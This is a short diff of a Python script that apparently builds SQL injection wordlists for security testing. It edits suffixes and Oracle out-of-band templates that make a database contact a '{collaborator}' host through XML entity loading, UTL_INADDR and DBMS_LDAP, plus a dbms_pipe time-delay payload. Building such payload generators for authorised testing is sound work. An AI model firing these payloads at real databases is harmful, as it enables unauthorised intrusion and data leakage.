@@ -17,7 +17,7 @@ sqlOperators = [
 ]
 
 suffixes = [
-    '',
+    # '',
     '--'
     # ' ("',
     # ' (("',
@@ -29,8 +29,8 @@ suffixes = [
 
 templates = [
     'SELECT EXTRACTVALUE(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator}/"> %remote;]>\'),\'/l\') FROM dual',
-    'SELECT UTL_INADDR.get_host_address("{collaborator}")',
-    'SELECT SYS.DBMS_LDAP.INIT("{collaborator}",80) FROM DUAL',
+    'SELECT utl_inaddr.get_host_address("{collaborator}")',
+    'SELECT sys.dbms_ldap.init("{collaborator}",80) FROM DUAL',
     '123=dbms_pipe.receive_message(("a"),{time})'
 ]
 
@@ -59,6 +59,7 @@ def generate_quick():
 
 
 def generate():
+    wordlist = []
     # injection via operators
     for prefix in prefixes:
         for sqlOperator in sqlOperators:
